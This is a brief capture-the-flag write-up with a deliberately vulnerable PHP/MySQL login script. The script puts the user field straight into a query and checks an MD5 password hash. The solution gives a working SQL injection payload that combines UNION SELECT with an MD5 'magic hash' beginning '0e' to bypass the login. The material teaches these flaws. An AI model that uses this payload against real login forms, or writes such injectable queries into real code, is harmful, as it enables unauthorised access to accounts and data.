# Challenge 
```php 
<?php
if($_POST[user] && $_POST[pass]) {
	$conn = mysql_connect("********", "*****", "********");
	mysql_select_db("phpformysql") or die("Could not select database");
	if ($conn->connect_error) {
		die("Connection failed: " . mysql_error($conn));
}
$user = $_POST[user];
$pass = md5($_POST[pass]);
$sql = "select pw from php where user='$user'";
$query = mysql_query($sql);
if (!$query) {
	printf("Error: %s\n", mysql_error($conn));
	exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pw"];
  if (($row[pw]) && (!strcasecmp($pass, $row[pw]))) {
	echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```
# Solution 
payload:
```
user=' union select "0e830400451993494058024219903391"#&pass=QNKCDZO
```

# Refference
+ [chybeta : 程序逻辑问题](https://chybeta.github.io/2017/07/24/%E5%AE%9E%E9%AA%8C%E5%90%A7-web-writeup/#%E7%A8%8B%E5%BA%8F%E9%80%BB%E8%BE%91%E9%97%AE%E9%A2%98)
